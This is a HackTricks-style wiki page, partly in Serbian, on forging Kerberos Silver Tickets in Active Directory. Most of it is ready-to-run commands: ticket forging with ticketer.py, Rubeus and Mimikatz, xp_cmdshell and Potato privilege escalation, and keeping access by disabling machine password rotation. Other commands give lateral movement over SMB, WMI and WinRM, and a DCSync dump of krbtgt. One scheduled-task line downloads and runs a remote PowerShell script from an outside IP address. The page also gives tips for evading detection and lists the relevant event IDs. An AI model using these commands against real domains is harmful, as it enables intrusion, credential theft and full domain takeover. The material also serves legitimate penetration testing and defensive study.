# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Napad **Silver Ticket** uključuje iskorišćavanje servisnih tiketa u Active Directory (AD) okruženjima. Ova metoda se zasniva na **dobijanju NTLM hasha servisnog naloga**, kao što je nalog računara, kako bi se falsifikovao Ticket Granting Service (TGS) tiket. Sa ovim falsifikovanim tiketom, napadač može pristupiti određenim servisima na mreži, **imitujući bilo kog korisnika**, obično sa ciljem dobijanja administratorskih privilegija. Naglašava se da je korišćenje AES ključeva za falsifikovanje tiketa sigurnije i manje detektabilno.

> [!WARNING]
> Silver Tickets are less detectable than Golden Tickets because they only require the **hash of the service account**, not the krbtgt account. However, they are limited to the specific service they target. Moreover, just stealing the password of a user.
> Moreover, if you compromise an **account's password with a SPN** you can use that password to create a Silver Ticket impersonating any user to that service.

### Modern Kerberos changes (AES-only domains)

- Windows updates starting **8 Nov 2022 (KB5021131)** default service tickets to **AES sesijske ključeve** when possible and are phasing out RC4. DCs are expected to ship with RC4 **disabled by default by mid‑2026**, so relying on NTLM/RC4 hashes for silver tickets increasingly fails with `KRB_AP_ERR_MODIFIED`. Uvek ekstrahujte **AES ključeve** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) za ciljani servisni nalog.
- If the service account `msDS-SupportedEncryptionTypes` is restricted to AES, you must forge with `/aes256` or `-aesKey`; RC4 (`/rc4` or `-nthash`) will not work even if you hold the NTLM hash.
- gMSA/computer accounts rotate every 30 days; dump the **current AES key** from LSASS, Secretsdump/NTDS, or DCsync before forging.
- OPSEC: default ticket lifetime in tools is often **10 years**; set realistic durations (e.g., `-duration 600` minutes) to avoid detection by abnormal lifetimes.

For ticket crafting, different tools are employed based on the operating system:

### Na Linuxu
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Na Windowsu
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS servis je istaknut kao uobičajeni cilj za pristup fajl-sistemu žrtve, ali drugi servisi poput HOST i RPCSS takođe se mogu iskoristiti za zadatke i WMI upite.

### Primer: MSSQL servis (MSSQLSvc) + Potato to SYSTEM

Ako imate NTLM hash (ili AES ključ) servisnog naloga za SQL (npr. sqlsvc), možete falsifikovati TGS za MSSQL SPN i impersonate bilo kog korisnika prema SQL servisu. Odatle omogućite xp_cmdshell da izvršavate komande kao servisni nalog SQL-a. Ako taj token poseduje SeImpersonatePrivilege, povežite Potato da eskalirate privilegije na SYSTEM.
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Ako rezultujući kontekst ima SeImpersonatePrivilege (često tačno za service accounts), koristi Potato varijantu da dobiješ SYSTEM:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Više detalja o zloupotrebi MSSQL-a i omogućavanju xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Pregled Potato tehnika:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Dostupne usluge

| Service Type                               | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Korišćenjem **Rubeus** možete **zatražiti sve** ove tikete koristeći parametar:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Event ID-ovi

- 4624: Account Logon
- 4634: Account Logoff
- 4672: Admin Logon
- **Nedostatak prethodnih 4768/4769 na DC-u** za istog klijenta/servis je čest indikator da je falsifikovani TGS predstavljen direktno servisu.
- Nenormalno dugo trajanje tiketa ili neočekivani tip enkripcije (RC4 kada domen zahteva AES) takođe se ističu u podacima 4769/4624.

## Persistencija

Da biste sprečili da mašine rotiraju svoju lozinku na svakih 30 dana, postavite `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` ili možete postaviti `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` na veću vrednost od 30 dana da naznačite period rotacije kada lozinka mašine treba da bude promenjena.

## Zloupotreba Service tickets

U sledećim primerima zamislimo da je tiket dobijen lažno predstavljajući se kao administratorski nalog.

### CIFS

Sa ovim tiketom moći ćete da pristupite `C$` i `ADMIN$` folderu putem **SMB** (ako su izloženi) i kopirate fajlove u deo udaljenog fajl sistema tako što ćete uraditi nešto poput:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Takođe ćete moći da dobijete shell na hostu ili izvršite proizvoljne komande koristeći **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Sa ovom dozvolom možete da generišete zakazane zadatke na udaljenim računarima i izvršite proizvoljne komande:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Sa ovim tickets možete **pokrenuti WMI na sistemu žrtve**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Pronađite **više informacija o wmiexec** na sledećoj stranici:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Sa winrm pristupom na računaru možete mu **pristupiti** i čak dobiti PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Pogledajte sledeću stranicu da saznate **više načina za povezivanje sa udaljenim hostom koristeći winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Imajte na umu da **winrm mora biti aktivan i osluškivati** na udaljenom računaru da biste mu pristupili.

### LDAP

Sa ovom privilegijom možete izvući DC bazu podataka koristeći **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Saznajte više o DCSync** na sledećoj stranici:


{{#ref}}
dcsync.md
{{#endref}}


## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [KB5021131 Kerberos hardening & RC4 deprecation](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [Impacket ticketer.py current options (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)



{{#include ../../banners/hacktricks-training.md}}
